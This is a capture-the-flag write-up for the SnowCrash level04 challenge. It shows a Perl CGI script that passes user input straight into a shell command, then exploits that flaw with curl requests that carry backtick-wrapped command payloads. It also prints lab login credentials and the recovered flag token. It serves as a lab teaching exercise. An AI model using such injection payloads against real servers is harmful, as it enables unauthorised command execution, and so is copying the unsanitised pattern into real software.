# Level04

## How to login

```
ssh level04@192.168.1.184 -p 4242
password: qi0maab88jeaj46qoumi7maus
```

## How to get the flag

Once logged, we find a file called 'level04.pl' in the home holder that seems to be a Perl script that uses the CGI (Common Gateway Interface) module to handle web requests.
```
level04@SnowCrash:~$ ls
level04.pl
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

After examination of the script, there is a commented line that seems to point that the script is designed to run as a CGI script on a web server running on localhost:4747. We wil use this info later to connect to the server.

It is also observed that the script is highly vulnerable to command injection because it directly converts the user input ($y) into a shell command without any kind of validation or sanitization. An attacker can exploit this by passing malicious input as the x parameter, which will be executed on the server.

So, with this information, we try to send a simple 'ls' command and verify if it is executed or not. For that purpose we use the command 'curl' together with the info obtained previously about the address and port. It's important to add backticks to the command in order to be executed, otherwise only the text 'ls' would be printed.
```
level04@SnowCrash:~$ curl localhost:4747?x="\`ls\`"
level04.pl
```

As expected, the command 'ls' is executed and the content of the home folder is displayed. So the next step is to try to execute 'getflag' and see if there is any luck. We are successful and the flag is found.
```
level04@SnowCrash:~$ curl localhost:4747?x="\`getflag\`"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```